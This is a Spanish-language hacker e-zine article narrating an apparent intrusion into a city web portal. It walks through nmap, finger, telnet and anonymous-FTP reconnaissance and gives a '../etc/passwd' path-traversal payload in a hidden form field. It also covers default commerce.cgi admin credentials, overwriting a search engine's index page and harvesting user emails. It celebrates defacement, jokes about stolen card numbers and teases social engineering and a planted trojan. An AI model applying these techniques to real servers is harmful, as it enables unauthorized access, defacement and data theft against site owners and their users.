@@ -1,0 +1,406 @@
+~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^
+kSh          kSh            kSh            kSh             kSh             kSh
+~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^
+
+
+Hackeando el portal de mi ciudad * 1ra parte
+----------------------------------------------
+
+En esta nota espero dar un pantallaso general de como muchas veces encontramos
+sitios Web, que si bien tienen instalada  la ultima version del SO que usan  y
+aparentemente no tienen  fallos de seguridad  faciles de explotar,  es posible
+sobre escribir el  contenido de algunas  de sus paginas  e inclusive conseguir
+acceso root al server gracias a la incompetencia de sus administradores.
+
+Basicamente podemos decir que la seguridad de un servidor no solo pasa por  el
+SO sino por la  correcta configuracion de TODOS  los servicios que ofrece.  Lo
+que detallare a continuacion es  la exploracion del servidor que  contiene las
+paginas web del portal de mi ciudad.
+
+Esta es solo una simulacion de como alguien podria haber entrado en un sistema
+y esta redactada en 1ra persona SOLO para hacerla mas interesante. obviamente,
+la ip y el host fueron cambiados para protejer la integridad del servidor.
+
+
+Objetivo
+--------
+www.victima.com (123.123.123.123)
+
+
+Primera aproximacion
+--------------------
+Lo primero, como todos ya sabemos  es recolectar todos los datos que  se pueda
+de  nuestro  objetivo,  para  lo  cual  usaremos  algunas  de  las  siguientes
+herramientas:
+
+-nmap         # www.insecure.org/nmap
+-finger
+-telnet (cliente)
+-ftp (cliente)     
+
+entonces...
+
+[xsombra@linux /home/xsombra] nmap -sS www.victima.com
+
+Starting nmap V. 2.07 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on www.victima.com (123.123.123.123):
+Port    State       Protocol  Service
+7       open        tcp        echo            
+9       open        tcp        discard         
+13      open        tcp        daytime         
+19      open        tcp        chargen         
+21      open        tcp        ftp             
+23      open        tcp        telnet  
+25      open        tcp        smtp            
+37      open        tcp        time            
+79      open        tcp        finger        # < ---- mucha informacion!
+80      open        tcp        http            
+111     open        tcp        sunrpc      
+512     open        tcp        exec            
+513     open        tcp        login           
+514     open        tcp        shell           
+515     open        tcp        printer         
+540     open        tcp        uucp            
+4045    open        tcp        lockd           
+6000    open        tcp        xterm           
+6112    open        tcp        dtspc           
+7100    open        tcp        font-service
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 98 seconds
+
+Bien, tenemos muchossss puertos abiertos y son generalmente los que quedan por
+default despues  de una  instalacion en  cualquier unix,  esto me  dice que el
+administrador no se esta ocupando debidamente de su sistema!.
+
+[xsombra@linux /home/xsombra]# finger @www.victima.com
+[www.victima.com]
+Login       Name               TTY         Idle    When    Where
+rjuancho   admin-de-victima     pts/3       3:32 Fri 19:46  async04.isp.com
+
+
+El administrador esta logueado... jejejeje
+
+Ahora  miremos  algo sobre  la  version de  SO  y los  demonios  que se  estan
+ejecuntando, el server web, de ftp, etc
+
+[xsombra@linux /home/xsombra]# telnet www.victima.com
+Trying 123.123.123.123
+Connected to www.victima.com
+Escape character is '^]'.
+
+SunOS 5.8          # <--- Solaris 8
+
+login:
+
+[xsombra@linux /home/xsombra]# telnet www.vicitima.net.ar 80
+Trying 123.123.123.123...
+Connected to www.victima.com
+Escape character is '^]'.
+GET / HTTP         # <--- Tipeo la siguiente linea y le doy enter 2 veces
+
+HTTP/1.1 200 OK
+Date: Mon, 09 Oct 2000 20:09:03 GMT
+Server: Apache/1.3.9 (Unix) mod_perl/1.21
+Last-Modified: Tue, 25 Jul 2000 11:53:39 GMT
+...
+
+[xsombra@linux /home/xsombra]# ftp www.vicitima.net.ar
+Connected to www.victima.com
+220 www FTP server (Version wu-2.6.1(2) Tue Sep 5 08:34:51 FST 2000) ready.
+Name (www.victima.com:root): anonymous   #<--- me logueo como usuario anonimo
+331 Guest login ok, send your complete e-mail address as password.
+Password:
+230 Guest login ok, access restrictions apply.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la     #<-- veamos que hay por aca...
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+total 14
+drwxr-xr-x   6 2000         512 Sep  5 12:22 .
+drwxr-xr-x   6 2000         512 Sep  5 12:22 ..
+d--x--x--x   2 1            512 Sep  5 11:30 bin
+drw-rw-rw-   2 1            512 Sep  5 12:05 dev
+-rwxrwxrwx   1 1              8 Sep  5 12:22 lala
+drwxrwxrwx   2 1            512 Sep  5 12:22 pub   #<-- se puede escribir
+d--x--x--x   3 1            512 Sep  5 11:51 usr
+226 Transfer complete.
+ftp> quit
+221-You have transferred 0 bytes in 0 files.
+221-Total traffic for this session was 792 bytes in 1 transfers.
+221-Thank you for using the FTP service on www.
+221 Goodbye.
+
+[xsombra@linux /home/xsombra]# telnet www.vicitima.net.ar 25
+Trying 123.123.123.123...
+Connected to www.victima.com
+Escape character is '^]'.
+220 www.victima.com ESMTP Sendmail 8.9.3+Sun/8.9.3; Mon, 9 Oct 2000 18:13:16
+quit
+221 www.victima.com closing connection
+Connection closed by foreign host.
+
+Y asi  podriamos seguir  recorriendo todos  los puertos... pero nos basaremos
+solo en estos por el momento. Ahora sabemos que:
+
+   -es un Solaris 8
+   -corre Apache/1.3.9 con mod_perl/1.21 como server Web
+   -el server ftp es un wu-2.6.1(2)
+   -la version de sendmail es, ESMTP Sendmail 8.9.3+Sun/8.9.3
+   -el administrador se loguea como rjuancho
+
+Ya  tenemos  unos cuantos  datos  de nuestro  objetivo,  como podemos  ver  el
+servidor es  un desastre,  pero a  pesar de  esto tiene  la ventaja  de ser un
+sistema relativamente nuevo. Por  lo que no pude  encontrar un exploit que  se
+aplicara en este caso, asi que seguimos buscando informacion a ver que pasa.
+
+
+Segunda aproximacion
+--------------------
+Lo  que  aremos  sera tomar  un  navegador  y ver  que  tiene  para ofrecernos
+www.victima.com, aunque  parezca mentira  se pueden  obtener muchos  datos con
+esta tecnica.
+
+La  pagina  esta  muy  bonita  y  ofrece  varios  servicios,  nosotros primero
+miraremos el codigo y trataremos de reconstruir la estructura de  directorios,
+del raiz de sus paginas.
+
+Luego de un rato tenemos lo siguiente...
+
+/cgi-bin/
+/cgi-bin/banner/
+/cgi-bin/encuestas/
+/cgi-bin/classifieds/
+/cgi-bin/com/
+/cgi-bin/com/store/       #<--- mmmm, interesante!
+/cgi-bin/search/
+/cgi-bin/cards/
+
+/images/                  #<--- **
+/images/others/
+/images/others/wallpaper/
+/images/photos/           #<--- **
+/images/slices/
+/images/icons/            #<--- **
+/images/icons/weather
+/images/icons/xxxx
+/images/icons/diario
+
+/noticias/                #<--- **
+/noticias/images/
+/noticias/images/slicehome
+/noticias/fotos/
+
+/media/                   #<--- **
+/media/encuestas/
+/media/encuestas/images/
+/media/encuestas/templates/
+/media/encuestas/users/
+/media/flash/
+/media/gifs/
+
+/webs/
+/elturista/
+/jovenes/
+/lared/
+/lanoche/
+/laciudad/
+/comunidad/
+/chat/
+/postales/
+/ventas/
+
+/encuestas/               #<--- **
+/encuestas/users/
+/encuestas/users/jovenes/
+/encuestas/templates/
+/encuestas/images/
+
+/library/                 #<--- **
+
+
+todas las llamadas ** quieren decir que se puede navegar el directorio esto es
+porque estan configurados con atributos tanto de lectura como de ejecucion.
+
+En algunos de estos directorios  encontre ademas de los archivos  normales con
+extension archivo.jpg o .sfw  ( macromedia flash )  otros que no me  esperaba,
+foto.jpg.lck  con el  sigiente mensaje  dentro  "victimaerror  (mchonli)" esos
+quizas sean generados por algun programa de ftp (cliente).
+
+- mchonli, sera un nombre de usuario?
+- esto es facil de averiguar:
+
+[xsombra@linux /home/xsombra]# finger -l mchonli@www.vicitima.net.ar
+[www.victima.com]
+Login name: mchonli    			In real life: web-malchot chonli
+Directory: /export/home/mchonls       	Shell: /bin/ksh
+Last login Mon Oct  2 21:18 on pts/5 from async14.elisp.com
+No unread mail
+No Plan.
+
+- si lo es :-)
+
+Tambien encontramos en las paginas que  visitamos que se ofrece un sistema  de
+busqueda  de  paginas web,  que  no esta  en  su domino  sino  en uno  al  que
+llamaremos www.buscador-victima.com
+
+- www.buscador-victima.com estara hosteado en el mismo server?
+- en este caso fue facil ya que haciendo un nslookup obtenemos la respuesta
+
+[xsombra@linux /home/xsombra]# nslookup 123.123.123.124 #<-- ip del buscador
+nslookup 123.123.123.124
+Server:  o200.dns.com
+Address:  321.321.321.321            #<--- my DNS
+
+Name:    www.victima.com        #<--- efectivamente ! :-) es el mismo
+Address: 123.123.123.123              
+
+Usando esta misma tecnica, y  recorriendo las paginas web encontramos  otros 5
+dominios que estaban hosteados en  este servidor. Entre ellos uno  dedicado al
+mundo de unix, que es del administrador. jejejejeje.... ( sin comentarios )
+
+otra cosa que  podemos rescatar de  las paginas web  es que cgi's  se usa, por
+ejemplo: 
+
+<A HREF="http://www.victima.com/cgi-bin/banners/ads.pl?banner=NonSSI;page=01">
+<IMG  SRC="http://www.victima.com/cgi-bin/banners/ads.pl?page=01"   border="0"
+height="60" width="468"> </A> 
+
+en este caso el cgi se llama  ads.pl es uno muy conocido que sirve  para rotar
+publicidades.   luego   solo  tenemos   que   buscar  en   algun   sitio  como
+http://cgi.resourceindex.com y obtener  el programa que  casi siempre sera  de
+codigo abierto.
+
+Ahora sabemos:
+
+   - parte de la estructura de directorios del sitio
+   - que cgi's usa
+   - otro nombre de usuario "mchonli"
+   - que hay al menos 5 dominios mas hosteados en el server   
+
+lo proximo que aremos sera buscar errores en los cgi's, para esto los  bajamos
+1x1 y los instalamos en nuestro sistema.
+
+
+Buscando errores
+----------------
+lo que  buscamos es  algun tipo  de error  en la  programacion del cgi que nos
+permita listar con el navegador el archivo /etc/passwd.
+
+esto seria  posible si  encontraramos algun  parametro que  el cgi muestre por
+pantalla por  ejemplo un  template. Algunos  cgi's utilizan  templates que son
+pasados como  paramentro en  el codigo  html, si  el cgi  esta mal escrito nos
+permitira  pasar  parametros arbitrarios  y  de esta  manera  podremos ver  el
+/etc/passwd ejemplo:
+
+<form name=comentarios method=POST action="/cgi-bin/coment/coment.cgi">
+<input type=hidden name=template value="template.html">
+<input type=submit name=enviar value="Enviar"></form>
+
+este cgi es llamado con el parametro template lo que nosotros intentamos hacer
+es algo como esto:
+
+<form name=comentarios method=POST action="/cgi-bin/coment/coment.cgi">
+<input type=hidden name=template value="../../../../../../etc/passwd">
+<input type=submit name=enviar value="Enviar"></form>
+
+el problema seria si internamente el cgi tiene una validacion de este tipo:
+
+  if ($in{'template'} =~ /^[\w\d_\-]+\.[\w\d_\-]+$/) 
+  {   
+    open (TPL, "<$db_template_path/$in{'template'}");
+    ...
+    close TPL;      
+  }
+  
+la condicion if indica  que el archivo solo  sera abierto si, empieza  con una
+letra tiene 1 punto y termina con una letra , es decir: archivo.extencion esto
+deja afuera ../../../../../../etc/passwd :-(
+
+Ninguno de  los cgi's  que eran  utilizados en  las paginas de www.victima.com
+tenian la bugnerabilidad... PERO ! :-)
+
+Encontre muchos detalles acerca de como deben ser configurados... por  ejemplo
+commerce.cgi tiene un sistema de administracion que permite agregar productos,
+editarlos, borrarlos, etc.
+en el readme dice lo siguiente:
+
+------------------------------------------------------------------
+Next, to  get the  store up  and running,  you will  need to  enable the Store
+Manager. While the Store Manager  itself uses simple password protection,  for
+greater  security  you  *must*  also  password  protect  the  /store/protected
+directory. 
+
+**REPEAT - YOU MUST PASSWORD PROTECT THE /store/protected Directory!
+------------------------------------------------------------------
+
+Efectivamente /store/protected/manager.cgi tiene un password por defecto  pero
+requiere que se proteja EL DIRECTORIO mediante password.
+
+en  el  commerce.cgi  de  www.victima.com no  habian  echo  nada  de esto.  el
+user/pass eran  richie/admin los  mismos que  trae el  cgi y  el directorio no
+tenia clave.
+
+Ya tenemos el control de su tienda virtual >:-> !!!!
+
+en www.buscador-victima.com,  el otro  dominio que  dependia del  mismo server
+usaban links 2.0  y tenian exactamente  el mismo problema,  solo que links.cgi
+genera las paginas principales basandose  en templates, por lo que  es posible
+sobre escribir la pagina principal del sistema de busqueda.
+
+Ahora tambien controlamos su buscador !!!!
+
+y por ultimo el cgi de postales llamado cards.cgi genera un log con todos  los
+e-mails de las personas que lo utilizan, en los readme dice claramente que por
+cuestiones de seguridad es aconsejable cambiar el nombre del archivo log pero,
+tampoco habian  echo esto.  Entre los  e-mail encontre  algunos con  extension
+@victima.com y luego de chequearlo con un finger descubir que casi todos  eran
+usuarios del server.
+
+Ahora tenemos  el control  de su  tienda virtual  de su  sistema de busqueda y
+tenemos unos  cuantos nombres  de usuario  que tienen  acceso al  server y sus
+direcciones de e-mail.
+
+
+Aplicando lo que sabemos
+------------------------
+En este punto podemos hacer 2 cosa, usar lo que sabemos y sobre escribir  unas
+cuantas paginas web o guardarnoslo he intentar conseguir algo mas  interesante
+como un pass de algun usuario.
+
+Me decidi por la primera porque, mi objetivo no era el de destruir nada.  solo
+queria provar la seguridad de este  sistema en particular y con esto  ya tenia
+como para entreterme.
+
+Asi  que sobre  escribi el  index.html del  buscador, y  agregue unos  cuantos
+productos nuevos al sistema de compras... 
+
+Se imaginan una palmIIIe a $0.10 Usted seguiria comprando aqui despues de esto
+? Se vende webmaster de victima.com! etc.
+
+jejejeje...
+
+Y ........ quien sabe, quizas consegui algunos numeros de targeta del  sistema
+de compras ;-) y  ahora estoy con mi  notebook tomando sol en  alguna isla del
+caribe!.
+
+
+Despedida
+---------
+No se crean que todo termina aqui,  hay muchas cosas mas por hacer todavia  en
+la segunda  entrega de  esta nota  veremos como  conseguimos el  pass de algun
+usuario con algo de ingenieria social y quizas hasta podamos modificar un  cgi
+para incluir un troyano y hacer que el webmaster lo instale por nosotros ! ;-)
+
+Y recuerden que como  dije al principio: la  seguridad de un servidor  no solo
+pasa por el SO sino por  la correcta configuracion de TODOS los  servicios que
+ofrece.
+
+hasta la proxima!..                                      
+
+   |XSombra| 
+xsombra@kshezine.org	
+
+~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^
+kSh          kSh            kSh            kSh             kSh             kSh
+~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^
